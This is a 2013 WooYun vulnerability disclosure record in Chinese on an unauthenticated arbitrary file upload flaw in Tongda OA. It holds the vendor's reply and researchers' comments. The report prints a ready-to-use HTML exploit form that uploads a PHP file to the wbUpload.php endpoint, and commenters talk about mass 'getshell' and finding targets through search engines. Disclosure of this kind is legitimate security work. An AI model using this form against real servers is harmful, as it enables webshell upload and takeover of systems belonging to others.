{"id": 7425, "wybug_id": "wooyun-2013-037642", "wybug_title": "通达OA存在任意文件上传漏洞", "wybug_corp": "tongda2000.com", "wybug_author": "tomdogs", "wybug_date": "2013-09-20 20:14", "wybug_open_date": "2013-12-16 20:15", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件上传内容未检查", "文件上传漏洞", "任意"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-24：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-11-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-16：\t细节向公众公开  简要描述： 通达OA存在任意文件上传漏洞 详细说明：  按说是一个老的漏洞了,今天好奇从官网上下载了一个新版的通达oa系统,安装测试了一下发现上传点依旧存在   漏洞证明：  \n产品更新时间2013年7月16日\n\n\n\n查看目录结构是否还存在漏洞文件\n\n\n\n继续使用以前的exp:<form enctype=\"multipart/form-data\" action=\"http://127.0.0.1/general/vmeet/wbUpload.php?fileName=test.php+\" method=\"post\"><input type=\"file\" name=\"Filedata\" size=\"50\"><br><input type=\"submit\" value=\"Upload\"></form>\n\n\n\n测试上传一个文件\n\n\n\n\n   修复方案：  我知道有可能你们会忽略这个漏洞,但是没有关系,我只希望你们能对你们的客户负责任。   版权声明：转载请注明来源 tomdogs@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-12-16 20:15 厂商回复： 首先非常感谢您对通达OA的支持！您发现的这个漏洞我们在2013年5月份发布的版本中已经解决了。我们确认了一下，现在从我们网站上下载的安装程序，安装后已经没有webroot/general/vmeet这个目录，所以也不会存在这个漏洞。本着对用户负责的态度，针对安装以前版本的老用户，我们也提供了修正程序来解决这个安全问题，并且之前已经通过电话、短信、邮件等多种形式通知了用户进行更新。您现在发现的问题，可能是因为之前安装过较早版本的通达OA，卸载时有文件残留，重新安装最新下载的版本时，还安装在了原路径导致的。您可以下载最新的修正合集安装一下，或将完整版安装在其他路径下再测试看看。再次感谢您对通达OA的支持！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-09-20 20:34 |    \t\tCroxy \t\t\t( 普通白帽子  |\t\t\t        Rank:513 漏洞数:54        | 只会送人头)\t\t \n  要不要登入？。。。    \n     2013-09-20 20:35 |    \t\t淡漠天空  \t\t\t( 实习白帽子  |\t\t\t        Rank:1113 漏洞数:142        | M:出售GOV  STATE NSA CIA NASA DHS Symant...)\t\t \n  @Croxy 通用。。。。不需要  getshell    \n     2013-09-20 20:37 |    \t\tCroxy \t\t\t( 普通白帽子  |\t\t\t        Rank:513 漏洞数:54        | 只会送人头)\t\t \n  @淡漠天空 神马    \n     2013-09-20 20:51 |    \t\t淡漠天空  \t\t\t( 实习白帽子  |\t\t\t        Rank:1113 漏洞数:142        | M:出售GOV  STATE NSA CIA NASA DHS Symant...)\t\t \n  @Croxy 直接getshell  批量    \n     2013-09-20 20:55 |    \t\t齐迹 \t\t\t( 核心白帽子 |\t\t\t        Rank:784 漏洞数:100        | 一名普通的phper开发者，关注web安全。)\t\t \n  目录权限是硬伤。。    \n     2013-09-20 20:56 |    \t\t淡漠天空  \t\t\t( 实习白帽子  |\t\t\t        Rank:1113 漏洞数:142        | M:出售GOV  STATE NSA CIA NASA DHS Symant...)\t\t \n  @齐迹 最新版 目录是可读。。。。    \n     2013-09-20 21:00 |    \t\ttomdogs \t\t\t( 实习白帽子  |\t\t\t        Rank:82 漏洞数:28        | 懒人一个)\t\t \n  @淡漠天空 没有发现目录遍历,直接getshell,路经没有变化    \n     2013-09-20 21:49 |    \t\tCroxy \t\t\t( 普通白帽子  |\t\t\t        Rank:513 漏洞数:54        | 只会送人头)\t\t \n  @淡漠天空 坐等 :)thanks    \n     2013-09-20 22:08 |    \t\t淡漠天空  \t\t\t( 实习白帽子  |\t\t\t        Rank:1113 漏洞数:142        | M:出售GOV  STATE NSA CIA NASA DHS Symant...)\t\t \n  @tomdogs 500QB。。。。    \n     2013-09-20 22:14 |    \t\ttomdogs \t\t\t( 实习白帽子  |\t\t\t        Rank:82 漏洞数:28        | 懒人一个)\t\t \n  @淡漠天空 没有啊    \n     2013-09-20 22:40 |    \t\t淡漠天空  \t\t\t( 实习白帽子  |\t\t\t        Rank:1113 漏洞数:142        | M:出售GOV  STATE NSA CIA NASA DHS Symant...)\t\t \n  @tomdogs 会有的  我懂得    \n     2013-09-20 22:47 |    \t\t光的圆周率 \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:1        | (<ゝω·)☆~Kira)\t\t \n  通达洞太多了....其实挺好的OA系统....就是不敢用...    \n     2013-09-20 23:16 |    \t\ttomdogs \t\t\t( 实习白帽子  |\t\t\t        Rank:82 漏洞数:28        | 懒人一个)\t\t \n  @光的圆周率 其实几乎没有什么漏洞,只是这个上传漏洞不知道为什么一直没有修复    \n     2013-09-20 23:22 |    \t\t淡漠天空  \t\t\t( 实习白帽子  |\t\t\t        Rank:1113 漏洞数:142        | M:出售GOV  STATE NSA CIA NASA DHS Symant...)\t\t \n  @tomdogs 而且公布了细节没人利用。。。。    \n     2013-09-20 23:57 |    \t\ttomdogs \t\t\t( 实习白帽子  |\t\t\t        Rank:82 漏洞数:28        | 懒人一个)\t\t \n  @淡漠天空 主要是大家找不到    \n     2013-09-21 01:36 |    \t\t淡漠天空  \t\t\t( 实习白帽子  |\t\t\t        Rank:1113 漏洞数:142        | M:出售GOV  STATE NSA CIA NASA DHS Symant...)\t\t \n  @tomdogs 谷歌那么关键词。。。。。蛋疼    \n     2013-09-21 20:03 |    \t\tmilk \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:5        | 美女，你肥皂掉了)\t\t \n  坐等~~    \n     2013-09-21 21:57 |    \t\t齐迹 \t\t\t( 核心白帽子 |\t\t\t        Rank:784 漏洞数:100        | 一名普通的phper开发者，关注web安全。)\t\t \n  有几个注入 都没心思提。。。反正是忽略的节奏    \n     2013-09-22 09:25 |    \t\t神在堕落 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:4        | 醉舞向山行)\t\t \n  这漏洞早有了,个人资料头像修改,上传什么文件都可以的.不登录后台不行的吧?    \n     2013-09-22 09:26 |    \t\t神在堕落 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:4        | 醉舞向山行)\t\t \n  还有致远的OA也是.都是无视这样的洞    \n     2013-09-22 09:27 |    \t\ttomdogs \t\t\t( 实习白帽子  |\t\t\t        Rank:82 漏洞数:28        | 懒人一个)\t\t \n  @神在堕落 不用登陆后台    \n     2013-09-22 11:41 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  马克之    \n     2013-09-23 21:20 |    \t\t光的圆周率 \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:1        | (<ゝω·)☆~Kira)\t\t \n  @tomdogs http://lcx.cc/?i=3316 这个..当时我们本来都打算用通达的OA 后来看到这个0day瞬间尿了,用当时的最新版测试过有效,就前几个月的事情吧...    \n     2013-09-24 00:52 |    \t\ttomdogs \t\t\t( 实习白帽子  |\t\t\t        Rank:82 漏洞数:28        | 懒人一个)\t\t \n  @光的圆周率 当时我也测试过,所以看到更新了就在测试一下,结果还在    \n     2013-09-24 17:46 |    \t\t齐迹 \t\t\t( 核心白帽子 |\t\t\t        Rank:784 漏洞数:100        | 一名普通的phper开发者，关注web安全。)\t\t \n  主动忽略，，求详情！访问xxoo/general/vmeet/ 提示文件已删除，是不是就没辙了？    \n     2013-09-25 08:58 |    \t\ttomdogs \t\t\t( 实习白帽子  |\t\t\t        Rank:82 漏洞数:28        | 懒人一个)\t\t \n  @齐迹 我测得是7月16日的,他在新的我就没看了,7月16日的当时还在    \n     2013-10-07 16:21 |    \t\tACGT \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:4        | another script kiddie)\t\t \n  楼主直接公布吧，官方都忽略了。。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}